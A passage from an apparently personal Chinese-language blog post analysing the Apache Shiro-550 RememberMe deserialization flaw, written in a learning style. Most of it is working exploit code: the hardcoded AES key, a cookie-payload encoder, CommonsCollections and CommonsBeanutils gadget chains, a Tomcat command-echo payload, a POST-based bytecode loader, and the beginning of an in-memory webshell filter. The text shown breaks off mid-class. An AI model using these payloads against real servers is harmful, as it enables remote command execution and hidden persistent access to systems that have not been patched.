title: Shiro反序列化漏洞
author: bmth
top_img: 'https://img-blog.csdnimg.cn/e6fd6b56d98d4696ab55e1f1ae33f25f.png'
cover: 'https://img-blog.csdnimg.cn/e6fd6b56d98d4696ab55e1f1ae33f25f.png'
tags:
  - 反序列化
categories:
  - java
date: 2022-03-09 13:16:00
---
![](https://img-blog.csdnimg.cn/e6fd6b56d98d4696ab55e1f1ae33f25f.png)
Apache Shiro是一个强大易用的Java安全框架，提供了认证、授权、加密和会话管理等功能。Shiro框架直观、易用，同时也能提供健壮的安全性
## Shiro-550
>影响版本：Apache Shiro <= 1.2.4

Apache Shiro框架提供了记住密码的功能（RememberMe），用户登录成功后会生成经过加密并编码的cookie。在服务端对RememberMe的cookie值，先base64解码然后AES解密再反序列化，就导致了反序列化RCE漏洞

找到1.2.4版本下载[https://codeload.github.com/apache/shiro/zip/refs/tags/shiro-root-1.2.4](https://codeload.github.com/apache/shiro/zip/refs/tags/shiro-root-1.2.4)
进入`samples/web`目录，修改一下pom配置文件，运行即可，这里我手动添加了commons-collections4，并且将jstl版本设置为1.2
```
<dependency>
	<groupId>javax.servlet</groupId>
	<artifactId>jstl</artifactId>
	<version>1.2</version>
	<scope>runtime</scope>
</dependency>
```
### 漏洞分析
如果登陆的时候不勾选RememberMe选项的情况下，Shiro是不会生成RememberMe的，勾选了RememberMe选项后，才会在认证的过程中生成该值

由于漏洞点在cookie，首先进入`CookieRememberMeManager#rememberSerializedIdentity`方法查看一下cookie的设置
![](https://img-blog.csdnimg.cn/081ca20d7b284feb8c243ea4260aac5c.png)
这里进行了base64编码然后添加到cookie当中，那么我们就需要看一下解密的`getRememberedSerializedIdentity`方法
![](https://img-blog.csdnimg.cn/bc447f21f51a4c38a720f713d0fb89f6.png)
获取cookie中的值，然后进行了base64解码，那么看一下哪里调用了`getRememberedSerializedIdentity`方法
![](https://img-blog.csdnimg.cn/a4f15ff78b0a47b989566800d5f62de4.png)
发现在`AbstractRememberMeManager#getRememberedPrincipals`方法
![](https://img-blog.csdnimg.cn/5e12a97b0aca4ba28479aae46cc655fb.png)
对bytes进行解密然后调用`convertBytesToPrincipals`方法，跟进一下
![](https://img-blog.csdnimg.cn/e07861170da0489c9919b1cd22a7503d.png)
发现对bytes首先`decrypt`解密，然后进行`deserialize`反序列化，如果bytes可控，并且能够成功解密，那么就存在反序列化漏洞了
![](https://img-blog.csdnimg.cn/5ea82cb7092545daa07d2ede5baad9d4.png)
跟进到`decrypt`发现需要一个key，说明为对称加密，那么不难猜测`getDecryptionCipherKey()`获取到的就是我们的key
![](https://img-blog.csdnimg.cn/f33ee5d1bbfc40769a496309f7343296.png)
最后发现key为一个定值
![](https://img-blog.csdnimg.cn/487398ec1a5346cc9396af8a2f1d23d0.png)

**注意：**
当密钥不正确或类型转换异常时，Response包含`Set-Cookie: rememberMe=deleteMe`字段
当密钥正确且没有类型转换异常时，返回包不存在`Set-Cookie: rememberMe=deleteMe`字段


### CommonsCollections链
那么我们逆推写出构造payload的代码：
```java
import com.sun.org.apache.xerces.internal.impl.dv.util.Base64;
import org.apache.shiro.crypto.AesCipherService;
import org.apache.shiro.util.ByteSource;
import java.io.*;


public class AESencode {
    public static void main(String[] args) throws Exception {
        String path = "C:\\Users\\bmth\\Desktop\\作业\\CTF学习\\java学习\\反序列化\\cc2";
        byte[] key = Base64.decode("kPH+bIxk5D2deZiIxcaaaA==");
        AesCipherService aes = new AesCipherService();
        ByteSource ciphertext = aes.encrypt(getBytes(path), key);
        System.out.printf(ciphertext.toString());
    }

    public static byte[] getBytes(String path) throws Exception{
        InputStream inputStream = new FileInputStream(path);
        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        int n = 0;
        while ((n=inputStream.read())!=-1){
            byteArrayOutputStream.write(n);
        }
        byte[] bytes = byteArrayOutputStream.toByteArray();
        return bytes;
    }
}
```
这里用的是TemplatesImpl加载字节码来进行攻击的，也就是ysoserial的cc2，得到payload后把JSESSIONID删除，修改rememberMe为我们的payload
![](https://img-blog.csdnimg.cn/6dd514a62db34a9e911f5723cc8c1ed8.png)
成功反弹计算器

测试发现如果使用**Transformer[]数组类会报错**：
```
2022-03-06 20:03:51,838 WARN  [org.apache.shiro.mgt.DefaultSecurityManager]: Delegate RememberMeManager instance of type [org.apache.shiro.web.mgt.CookieRememberMeManager] threw an exception during getRememberedPrincipals().
org.apache.shiro.io.SerializationException: Unable to deserialze argument byte array.

Caused by: java.lang.ClassNotFoundException: Unable to load ObjectStreamClass [[Lorg.apache.commons.collections4.Transformer;: static final long serialVersionUID = 4143657982017290149L;]: 
```
`[L`是一个JVM的标记，说明实际上这是一个数组，即`Transformer[]`
这里反序列化使用的是`ClassResolvingObjectInputStream` shiro自带的方法
![](https://img-blog.csdnimg.cn/fad48a6b436f4a56873aa7efd56feca4.png)
这里跟进`ClassResolvingObjectInputStream`方法
![](https://img-blog.csdnimg.cn/befc36ba004d49338e49da1e6c57a55c.png)
发现Shiro重写了 resolveClass 的实现，更换了查找方式
>Shiro resovleClass使用的是ClassLoader.loadClass()而非Class.forName()，而ClassLoader.loadClass不支持装载数组类型的class

这里将Commons-Collections版本更改为3.2.1，然后进行测试
```
<dependency>
	<groupId>commons-collections</groupId>
	<artifactId>commons-collections</artifactId>
	<version>3.2.1</version>
</dependency>
```

发现cc1-7的利用链都不行了，需要重新创造一条新的利用链
参考p神的：[https://github.com/phith0n/JavaThings/blob/master/shiroattack/src/main/java/com/govuln/shiroattack/CommonsCollectionsShiro.java](https://github.com/phith0n/JavaThings/blob/master/shiroattack/src/main/java/com/govuln/shiroattack/CommonsCollectionsShiro.java)
```java
package CommonsCollections;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import javassist.ClassPool;
import javassist.CtClass;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import java.io.*;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.Map;

public class cc_shiro {
    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj, value);
    }
    public static void main(String[] args) throws Exception{
        //读取恶意类 bytes[]
        String AbstractTranslet="com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet";
        ClassPool classPool=ClassPool.getDefault();
        classPool.appendClassPath(AbstractTranslet);
        CtClass payload=classPool.makeClass("CommonsCollectionsshiro");
        payload.setSuperclass(classPool.get(AbstractTranslet));
        payload.makeClassInitializer().setBody("java.lang.Runtime.getRuntime().exec(\"calc\");");
        //转换为byte数组
        byte[] bytes=payload.toBytecode();

        TemplatesImpl obj = new TemplatesImpl();
        setFieldValue(obj, "_bytecodes", new byte[][] {bytes});
        setFieldValue(obj, "_name", "HelloTemplatesImpl");
        setFieldValue(obj, "_tfactory", new TransformerFactoryImpl());

        Transformer transformer = new InvokerTransformer("getClass", null, null);

        Map innerMap = new HashMap();
        Map outerMap = LazyMap.decorate(innerMap, transformer);

        TiedMapEntry tme = new TiedMapEntry(outerMap, obj);

        Map expMap = new HashMap();
        expMap.put(tme, "valuevalue");

        outerMap.clear();
        setFieldValue(transformer, "iMethodName", "newTransformer");

        try{
            ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream("./cc_shiro"));
            outputStream.writeObject(expMap);
            outputStream.close();

            ObjectInputStream inputStream = new ObjectInputStream(new FileInputStream("./cc_shiro"));
            inputStream.readObject();
        }catch(Exception e){
            e.printStackTrace();
        }

    }
}
```
调用链：
```
HashMap.put()
HashMap.hash()
  TiedMapEntry.hashCode()
  TiedMapEntry.getValue()
    LazyMap.get()
      InvokerTransformer.transform()
        TemplatesImpl.newTransformer()
          TemplatesImpl.getTransletInstance()
            TemplatesImpl.defineTransletClasses()  //定义类
```


参考：
[强网杯“彩蛋”——Shiro 1.2.4(SHIRO-550)漏洞之发散性思考](https://blog.zsxsoft.com/post/35)
[Java反序列化利用链分析之Shiro反序列化 ](https://www.anquanke.com/post/id/192619)
[Shiro 550 漏洞学习（一）](http://wjlshare.com/archives/1542)
[shiro550反序列化分析踩坑](http://w4nder.top/index.php/2021/03/09/shiro550/)

### CommonsBeanutils链
其实shiro自带一个CommonsBeanutils1.8.3，那么我们只要能构造一个CommonsBeanutils链的gadget，那么就可以直接无CommonsCollections打shiro了

在CB包中提供了一个静态方法`PropertyUtils#getProperty`，让使用者可以直接调用任意JavaBean的getter方法
![](https://img-blog.csdnimg.cn/95c9c24b17f54c7bbfa8a8af20199a64.png)
此时，CommonsBeanutils会自动找到name属性的getter方法， 然后调用，获得返回值
并且看到类`org.apache.commons.beanutils.BeanComparator`的compare方法
![](https://img-blog.csdnimg.cn/f394a1c1f00f4a56800dd9e8569c9911.png)
这个方法传入两个对象，如`property`为空，则直接比较这两个对象；如果`property`不为空，则用 `PropertyUtils.getProperty`分别取这两个对象的`property`属性，比较属性的值

看到`PropertyUtils.getProperty(o1,property)`这段代码，当`o1`是一个`TemplatesImpl`对象，而`property`的值为`outputProperties`时，将会自动调用getter，也就是`TemplatesImpl#getOutputProperties()`方法，触发代码执行
```
TemplatesImpl#getOutputProperties() -> TemplatesImpl#newTransformer() -> TemplatesImpl#getTransletInstance() -> TemplatesImpl#defineTransletClasses() -> TransletClassLoader#defineClass()
```
那么我们新建一个TemplatesImpl，根据上面的分析，我们需要有一个`org.apache.commons.beanutils.BeanComparator`，new一个出来，然后通过`PropertyUtils.getProperty`对队列进行比较，触发`compare()`方法， 而当`property`不为空的时候调用`TemplatesImpl#getOutputProperties`方法 实现反序列化利用
```java
import java.io.*;
import java.lang.reflect.Field;
import java.util.PriorityQueue;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import javassist.ClassPool;
import javassist.CtClass;
import org.apache.commons.beanutils.BeanComparator;

public class cb1 {
    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj, value);
    }
    public static void main(String[] args) throws Exception {
        String AbstractTranslet="com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet";
        ClassPool classPool=ClassPool.getDefault();
        classPool.appendClassPath(AbstractTranslet);
        CtClass payload=classPool.makeClass("CommonsBeanutils1");
        payload.setSuperclass(classPool.get(AbstractTranslet));
        payload.makeClassInitializer().setBody("java.lang.Runtime.getRuntime().exec(\"calc\");");
        byte[] bytes=payload.toBytecode();

        TemplatesImpl obj = new TemplatesImpl();
        setFieldValue(obj, "_bytecodes", new byte[][]{bytes});
        setFieldValue(obj, "_name", "HelloTemplatesImpl");
        setFieldValue(obj, "_tfactory", new TransformerFactoryImpl());
        final BeanComparator comparator = new BeanComparator();
        final PriorityQueue<Object> queue = new PriorityQueue<Object>(2, comparator);
        // stub data for replacement later
        queue.add(1);
        queue.add(1);
        setFieldValue(comparator, "property", "outputProperties");
        setFieldValue(queue, "queue", new Object[]{obj, obj});

        try{
            ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream("./cb1"));
            outputStream.writeObject(queue);
            outputStream.close();

            ObjectInputStream inputStream = new ObjectInputStream(new FileInputStream("./cb1"));
            inputStream.readObject();
        }catch(Exception e){
            e.printStackTrace();
        }
    }
}
```
但运行时发送报错
![](https://img-blog.csdnimg.cn/5263b227a4a44317a81f75ba347acfbc.png)
发现`org.apache.commons.beanutils.BeanComparator`这个类调用了`org.apache.commons.collections.comparators.ComparableComparator`
![](https://img-blog.csdnimg.cn/85f883f9f2e044e28021f2522a244372.png)
在 BeanComparator 类的构造函数处，当没有显式传入 Comparator 的情况下，则默认使用 ComparableComparator
![](https://img-blog.csdnimg.cn/252677e6ce394edca74d783e1c90649b.png)
既然此时没有 ComparableComparator ，我们需要找到一个类来替换，它满足下面这几个条件:
- 实现 java.util.Comparator 接口
- 实现 java.io.Serializable 接口
- Java、shiro或commons-beanutils自带，且兼容性强

这里找到一个`java.lang.String$CaseInsensitiveComparator`类
![](https://img-blog.csdnimg.cn/1d24bf2e7bb8472eb34e649aa56b0c45.png)
这个类是`java.lang.String`类下的一个内部私有类，其实现了`Comparator`和`Serializable`
我们可以通过`String.CASE_INSENSITIVE_ORDER`即可拿到上下文中的`CaseInsensitiveComparator`对象，用它来实例化 BeanComparator
```java
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import javassist.ClassPool;
import javassist.CtClass;
import org.apache.commons.beanutils.BeanComparator;

import java.io.*;
import java.lang.reflect.Field;
import java.util.PriorityQueue;
public class cb1_shiro {
    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj, value);
    }
    public static void main(String[] args) throws Exception{
        String AbstractTranslet="com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet";
        ClassPool classPool=ClassPool.getDefault();
        classPool.appendClassPath(AbstractTranslet);
        CtClass payload=classPool.makeClass("CommonsBeanutils1");
        payload.setSuperclass(classPool.get(AbstractTranslet));
        payload.makeClassInitializer().setBody("java.lang.Runtime.getRuntime().exec(\"calc\");");
        byte[] bytes=payload.toBytecode();

        TemplatesImpl obj = new TemplatesImpl();
        setFieldValue(obj, "_bytecodes", new byte[][]{bytes});
        setFieldValue(obj, "_name", "HelloTemplatesImpl");
        setFieldValue(obj, "_tfactory", new TransformerFactoryImpl());
        final BeanComparator comparator = new BeanComparator(null, String.CASE_INSENSITIVE_ORDER);
        final PriorityQueue<Object> queue = new PriorityQueue<Object>(2, comparator);
        // stub data for replacement later
        queue.add("1");
        queue.add("1");
        setFieldValue(comparator, "property", "outputProperties");
        setFieldValue(queue, "queue", new Object[]{obj, obj});

        try{
            ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream("./cb1"));
            outputStream.writeObject(queue);
            outputStream.close();

            ObjectInputStream inputStream = new ObjectInputStream(new FileInputStream("./cb1"));
            inputStream.readObject();
        }catch(Exception e){
            e.printStackTrace();
        }

    }
}
```
调用链：
```
PriorityQueue.readObject()
  PriorityQueue.heapify()
  PriorityQueue.siftDown()
  PriorityQueue.siftDownUsingComparator()
    comparator.compare() === BeanComparator.compare()
      TemplatesImpl.getOutputProperties()
        TemplatesImpl.newTransformer()
          TemplatesImpl.getTransletInstance()
            TemplatesImpl.defineTransletClasses()
	  ...  // 创建类实例，触发static代码块
```
然后在P神的知识星球上说还存在一个类`java.util.Collections$ReverseComparator`
![](https://img-blog.csdnimg.cn/c5982fb862c64308a0fc2dd888f9f4ff.png)
利用反射修改`BeanComparator#comparator`属性替换为jre自带类即可，这里是`Collections.reverseOrder()`
```java
BeanComparator comparator=new BeanComparator(null, Collections.reverseOrder());
```

参考：
[Commons-Beanutils利用链分析 ](https://www.cnblogs.com/9eek/p/15123125.html)
[JAVA反序列化对于Shiro的应用](https://ha1c9on.top/?p=1938)
[CommonsBeanutils与无commons-collections的Shiro反序列化利用](https://www.leavesongs.com/PENETRATION/commons-beanutils-without-commons-collections.html)

### shiro回显与内存马
>这里tomcat环境为9.0.43

如果shiro在不出网的情况下，那么我们就无法将dnslog带出，并且反弹不了shell，只能通过延时来确定我们的命令是否执行成功，那么我们就需要获取回显或者写入一个内存马了

#### 回显实现
>思路：
>通过反射修改控制变量，来改变Tomcat处理请求时的流程，使得Tomcat处理请求时便将request,response存入ThreadLocal中，最后在反序列化的时候便可以利用ThreadLocal来取出response

具体可以看下面的参考文章，水平有限就不分析了，大佬们分析的很详细，直接看文末大佬文章吧Orz
工具：[https://github.com/Litch1-v/ysoserial](https://github.com/Litch1-v/ysoserial)
这里我们同样使用javassit，然后加载回显代码：[https://github.com/Litch1-v/ysoserial/blob/master/src/main/java/ysoserial/payloads/util/Gadgets.java](https://github.com/Litch1-v/ysoserial/blob/master/src/main/java/ysoserial/payloads/util/Gadgets.java)
```java
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import javassist.ClassPool;
import javassist.CtClass;
import org.apache.commons.beanutils.BeanComparator;

import java.io.*;
import java.lang.reflect.Field;
import java.util.Collections;
import java.util.PriorityQueue;

public class TomcatEcho2 {
    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj, value);
    }
    public static void main(String[] args) throws Exception{
        String AbstractTranslet="com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet";
        ClassPool classPool=ClassPool.getDefault();
        classPool.appendClassPath(AbstractTranslet);
        CtClass payload=classPool.makeClass("TomcatEcho2");
        payload.setSuperclass(classPool.get(AbstractTranslet));
        String template = "try {\n" +
                "            java.lang.reflect.Field contextField = org.apache.catalina.core.StandardContext.class.getDeclaredField(\"context\");\n" +
                "            java.lang.reflect.Field serviceField = org.apache.catalina.core.ApplicationContext.class.getDeclaredField(\"service\");\n" +
                "            java.lang.reflect.Field requestField = org.apache.coyote.RequestInfo.class.getDeclaredField(\"req\");\n" +
                "            java.lang.reflect.Method getHandlerMethod = org.apache.coyote.AbstractProtocol.class.getDeclaredMethod(\"getHandler\",null);" +
                "            contextField.setAccessible(true);\n" +
                "            serviceField.setAccessible(true);\n" +
                "            requestField.setAccessible(true);\n" +
                "            getHandlerMethod.setAccessible(true);\n" +
                "            org.apache.catalina.loader.WebappClassLoaderBase webappClassLoaderBase =\n" +
                "                    (org.apache.catalina.loader.WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();\n" +
                "            org.apache.catalina.core.ApplicationContext applicationContext = (org.apache.catalina.core.ApplicationContext) contextField.get(webappClassLoaderBase.getResources().getContext());\n" +
                "            org.apache.catalina.core.StandardService standardService = (org.apache.catalina.core.StandardService) serviceField.get(applicationContext);\n" +
                "            org.apache.catalina.connector.Connector[] connectors = standardService.findConnectors();\n" +
                "            for (int i=0;i<connectors.length;i++) {\n" +
                "                if (4==connectors[i].getScheme().length()) {\n" +
                "                    org.apache.coyote.ProtocolHandler protocolHandler = connectors[i].getProtocolHandler();\n" +
                "                    if (protocolHandler instanceof org.apache.coyote.http11.AbstractHttp11Protocol) {\n" +
                "                        Class[] classes = org.apache.coyote.AbstractProtocol.class.getDeclaredClasses();\n" +
                "                        for (int j = 0; j < classes.length; j++) {\n" +
                "                            if (52 == (classes[j].getName().length())||60 == (classes[j].getName().length())) {\n" +
                "                                java.lang.reflect.Field globalField = classes[j].getDeclaredField(\"global\");\n" +
                "                                java.lang.reflect.Field processorsField = org.apache.coyote.RequestGroupInfo.class.getDeclaredField(\"processors\");\n" +
                "                                globalField.setAccessible(true);\n" +
                "                                processorsField.setAccessible(true);\n" +
                "                                org.apache.coyote.RequestGroupInfo requestGroupInfo = (org.apache.coyote.RequestGroupInfo) globalField.get(getHandlerMethod.invoke(protocolHandler,null));\n" +
                "                                java.util.List list = (java.util.List) processorsField.get(requestGroupInfo);\n" +
                "                                for (int k = 0; k < list.size(); k++) {\n" +
                "                                    org.apache.coyote.Request tempRequest = (org.apache.coyote.Request) requestField.get(list.get(k));\n" +
                "                                    if (\"tomcat\".equals(tempRequest.getHeader(\"tomcat\"))) {\n" +
                "                                        org.apache.catalina.connector.Request request = (org.apache.catalina.connector.Request) tempRequest.getNote(1);\n" +
                "                                        String cmd = tempRequest.getHeader(\"X-FLAG\");\n" +
                "                                        String[] cmds = !System.getProperty(\"os.name\").toLowerCase().contains(\"win\") ? new String[]{\"sh\", \"-c\", cmd} : new String[]{\"cmd.exe\", \"/c\", cmd};\n" +
                "                                        java.io.InputStream in = Runtime.getRuntime().exec(cmds).getInputStream();\n" +
                "                                        java.util.Scanner s = new java.util.Scanner(in).useDelimiter(\"\\\\a\");\n" +
                "                                        String output = s.hasNext() ? s.next() : \"\";\n" +
                "                                        java.io.Writer writer = request.getResponse().getWriter();\n" +
                "                                        java.lang.reflect.Field usingWriter = request.getResponse().getClass().getDeclaredField(\"usingWriter\");\n" +
                "                                        usingWriter.setAccessible(true);\n" +
                "                                        usingWriter.set(request.getResponse(), Boolean.FALSE);\n" +
                "                                        writer.write(output);\n" +
                "                                        writer.flush();\n" +
                "                                        break;\n" +
                "                                    }\n" +
                "                                }\n" +
                "                                break;\n" +
                "                            }\n" +
                "                        }\n" +
                "                    }\n" +
                "                    break;\n" +
                "                }\n" +
                "            }\n" +
                "        }catch (Exception e){\n" +
                "        }";
        payload.makeClassInitializer().setBody(template);
        byte[] bytes=payload.toBytecode();

        TemplatesImpl obj = new TemplatesImpl();
        setFieldValue(obj, "_bytecodes", new byte[][]{bytes});
        setFieldValue(obj, "_name", "HelloTemplatesImpl");
        setFieldValue(obj, "_tfactory", new TransformerFactoryImpl());
//        BeanComparator comparator = new BeanComparator(null, String.CASE_INSENSITIVE_ORDER);
        BeanComparator comparator=new BeanComparator(null, Collections.reverseOrder());
        PriorityQueue<Object> queue = new PriorityQueue<Object>(2, comparator);
        // stub data for replacement later
        queue.add("1");
        queue.add("1");
        setFieldValue(comparator, "property", "outputProperties");
        setFieldValue(queue, "queue", new Object[]{obj, obj});

        try{
            ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream("./cb1_shell"));
            outputStream.writeObject(queue);
            outputStream.close();

//            ObjectInputStream inputStream = new ObjectInputStream(new FileInputStream("./cb1_shell"));
//            inputStream.readObject();
        }catch(Exception e){
            e.printStackTrace();
        }

    }
}
```
然后使用AESencode.java生成payload，需要添加一下请求头
```
headers={"tomcat": "tomcat","X-FLAG": "whoami"}
```
![](https://img-blog.csdnimg.cn/f42d147b68434f88806bf84bb57d57d8.png)

**从Post请求中获取字节码加载，适用于Tomcat 7、8、9（解决请求头长度限制问题）**
TD类代码实现：
该类是在TemplatesImpl加载的字节码的类，该类中从Acceptor线程中获取request和response对象，获取请求Post参数中的字节码base64解码后，加载调用对象的equals方法（传入获取request和response对象）
```java
import java.lang.reflect.Field;
import java.util.Iterator;


//加载字节码的类
public class TD {
    static {
        Object jioEndPoint = GetAcceptorThread();
        if (jioEndPoint != null) {
            java.util.ArrayList processors = (java.util.ArrayList) getField(getField(getField(jioEndPoint, "handler"), "global"), "processors");
            Iterator iterator = processors.iterator();
            while (iterator.hasNext()) {
                Object next = iterator.next();
                Object req = getField(next, "req");
                Object serverPort = getField(req, "serverPort");
                if (serverPort.equals(-1)) {
                    continue;
                }
                org.apache.catalina.connector.Request request = (org.apache.catalina.connector.Request) ((org.apache.coyote.Request) req).getNote(1);
                org.apache.catalina.connector.Response response = request.getResponse();
                String code = request.getParameter("shell");
                if (code != null) {
                    try {
                        byte[] classBytes = new sun.misc.BASE64Decoder().decodeBuffer(code);
                        java.lang.reflect.Method defineClassMethod = ClassLoader.class.getDeclaredMethod("defineClass", new Class[]{byte[].class, int.class, int.class});
                        defineClassMethod.setAccessible(true);
                        Class cc = (Class) defineClassMethod.invoke(TD.class.getClassLoader(), classBytes, 0, classBytes.length);
                        cc.newInstance().equals(new Object[]{request, response});
                    } catch (Exception e) {
                        e.printStackTrace();
                    }
                }
            }
        }
    }
    public static Object getField(Object object, String fieldName) {
        Field declaredField;
        Class clazz = object.getClass();
        while (clazz != Object.class) {
            try {

                declaredField = clazz.getDeclaredField(fieldName);
                declaredField.setAccessible(true);
                return declaredField.get(object);
            } catch (Exception e) {
            }
            clazz = clazz.getSuperclass();
        }
        return null;
    }

    public static Object GetAcceptorThread() {
        Thread[] threads = (Thread[]) getField(Thread.currentThread().getThreadGroup(), "threads");
        for (Thread thread : threads) {
            if (thread == null || thread.getName().contains("exec")) {
                continue;
            }
            if ((thread.getName().contains("Acceptor")) && (thread.getName().contains("http"))) {
                Object target = getField(thread, "target");
                if (!(target instanceof Runnable)) {
                    try {
                        Object target2 = getField(thread, "this$0");
                        target = thread;
                    } catch (Exception e) {
                        continue;
                    }
                }
                Object jioEndPoint = getField(target, "this$0");
                if (jioEndPoint == null) {
                    try {
                        jioEndPoint = getField(target, "endpoint");
                    } catch (Exception e) {
                        continue;
                    }
                }
                return jioEndPoint;
            }
        }
        return null;
    }
}
```
TomcatEcho类代码实现：
该类的字节码会被base64编码后，放在shell请求参数中。在TD类中获取该参数并加载
```java
import java.io.InputStream;
import java.util.Scanner;

public class TomcatEcho {
    public boolean equals(Object req) {
        Object[] context=(Object[]) req;
        org.apache.catalina.connector.Request request=(org.apache.catalina.connector.Request)context[0];
        org.apache.catalina.connector.Response response=(org.apache.catalina.connector.Response)context[1];
        String cmd = request.getParameter("cmd");
        if (cmd != null) {
            try {
                boolean isLinux = true;
                String osTyp = System.getProperty("os.name");
                if (osTyp != null && osTyp.toLowerCase().contains("win")) {
                    isLinux = false;
                }
                String[] cmds = isLinux ? new String[]{"sh", "-c", cmd} : new String[]{"cmd.exe", "/c", cmd};
                response.setContentType("text/html;charset=utf-8");
                InputStream in = Runtime.getRuntime().exec(cmds).getInputStream();
                Scanner s = new Scanner(in).useDelimiter("\\A");
                String output = s.hasNext() ? s.next() : "";
                response.getWriter().println("----------------------------------");
                response.getWriter().println(output);
                response.getWriter().println("----------------------------------");
                response.getWriter().flush();
                response.getWriter().close();
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
        return true;
    }
}
```
post_run类代码实现：
通过CommonsBeanutils利用链加载TD类的字节码，生成序列化数据
```java
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import javassist.ClassClassPath;
import javassist.ClassPool;
import javassist.CtClass;
import org.apache.commons.beanutils.BeanComparator;

import java.io.*;
import java.lang.reflect.Field;
import java.util.Base64;
import java.util.PriorityQueue;

//post字节码绕过长度限制
public class post_run {
    public static void main(String[] args) {
        try {
            //获取字节码
            ClassPool pool = ClassPool.getDefault();
            pool.insertClassPath(new ClassClassPath(post_run.class.getClass()));
            CtClass ctClass = pool.get("TD");
            ctClass.setSuperclass(pool.get(AbstractTranslet.class.getName()));
            byte[] classBytes = ctClass.toBytecode();

            CtClass ctClass2 = pool.get("TomcatEcho");
            byte[] classBytes2 = ctClass2.toBytecode();
            System.out.println("post请求参数shell\n" + Base64.getEncoder().encodeToString(classBytes2));

            TemplatesImpl templates = TemplatesImpl.class.newInstance();
            setField(templates, "_name", "name");
            setField(templates, "_bytecodes", new byte[][]{classBytes});
            setField(templates, "_tfactory", new TransformerFactoryImpl());
            setField(templates, "_class", null);

            BeanComparator beanComparator = new BeanComparator("outputProperties", String.CASE_INSENSITIVE_ORDER);

            PriorityQueue priorityQueue = new PriorityQueue(2, beanComparator);

            setField(priorityQueue, "queue", new Object[]{templates, templates});
            setField(priorityQueue, "size", 2);

            ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream("./CommonsBeanutils"));
            outputStream.writeObject(priorityQueue);
            outputStream.close();

//            ObjectInputStream inputStream = new ObjectInputStream(new FileInputStream("./CommonsBeanutils"));
//            inputStream.readObject();
//            inputStream.close();
        } catch (Exception e) {
        }

    }
    public static void setField(Object object, String field, Object args) throws Exception {
        Field f0 = object.getClass().getDeclaredField(field);
        f0.setAccessible(true);
        f0.set(object, args);

    }
}
```
![](https://img-blog.csdnimg.cn/52aba78222794b10b5a307b1edb9a801.png)

#### 内存马实现
memery类代码实现：
和上面回显的cmd类差不多，只是换成了注册filter。注意，不能将注入的filter写成内部类或者匿名内部类，`CtClass ctClass2 = pool.get("deserialize.memery"); `是不会获取到它的内部类的，所以这里直接让memery类实现Filter接口，成为Filter类
```java
import org.apache.catalina.Context;
import org.apache.catalina.core.ApplicationContext;
import org.apache.catalina.core.ApplicationFilterConfig;
import org.apache.catalina.core.StandardContext;
import org.apache.tomcat.util.descriptor.web.FilterDef;
import org.apache.tomcat.util.descriptor.web.FilterMap;

import javax.servlet.*;
import javax.servlet.http.HttpServletRequest;
import java.io.IOException;
import java.io.InputStream;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.util.Map;
import java.util.Scanner;

public class memery implements Filter{
    @Override
    public void init(FilterConfig filterConfig) throws ServletException {

    }

    @Override
    public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {
        HttpServletRequest req = (HttpServletRequest) servletRequest;
        if (req.getParameter("cmd") != null) {
            try {
                boolean isLinux = true;
                String osTyp = System.getProperty("os.name");
                if (osTyp != null && osTyp.toLowerCase().contains("win")) {
                    isLinux = false;
                }
                String[] cmds = isLinux ? new String[]{"sh", "-c", req.getParameter("cmd")} : new String[]{"cmd.exe", "/c", req.getParameter("cmd")};
                servletResponse.setContentType("text/html;charset=utf-8");
                InputStream in = Runtime.getRuntime().exec(cmds).getInputStream();
                Scanner s = new Scanner(in).useDelimiter("\\A");
                String output = s.hasNext() ? s.next() : "";
                servletResponse.getWriter().println("----------------------------------");
                servletResponse.getWriter().println(output);
                servletResponse.getWriter().println("----------------------------------");
                servletResponse.getWriter().flush();
                servletResponse.getWriter().close();
            } catch (Exception e) {
                e.printStackTrace();
            }
            return;
        }
        try {
            filterChain.doFilter(servletRequest, servletResponse);
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    @Override
    public void destroy() {

    }
    @Override
    public boolean equals(Object req) {
        Object[] context=(Object[]) req;
        org.apache.catalina.connector.Request request=(org.apache.catalina.connector.Request)context[0];
